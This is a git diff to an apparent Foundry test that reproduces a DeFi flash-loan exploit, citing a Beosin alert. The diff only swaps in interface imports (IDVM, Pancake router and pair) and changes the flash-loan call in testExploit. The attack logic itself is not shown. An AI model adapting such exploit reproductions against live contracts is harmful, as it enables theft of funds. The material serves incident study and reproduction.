@@ -3,6 +3,12 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IPancakeRouter} from "src/interfaces/IPancakeRouter.sol";
+import {IPancakePair} from "src/interfaces/IPancakePair.sol";
+import {IDVM} from "src/interfaces/IDVM.sol";
+
 // @Analysis
 // https://twitter.com/BeosinAlert/status/1648520494516420608
 // @TX
@@ -37,7 +43,7 @@ contract ContractTest is Test {
     }
 
     function testExploit() external {
-        DVM(dodo).flashLoan(FLASHLOAN_WBNB_AMOUNT, 0, address(this), new bytes(1));
+        IDVM(dodo).flashLoan(FLASHLOAN_WBNB_AMOUNT, 0, address(this), new bytes(1));
 
         emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
     }
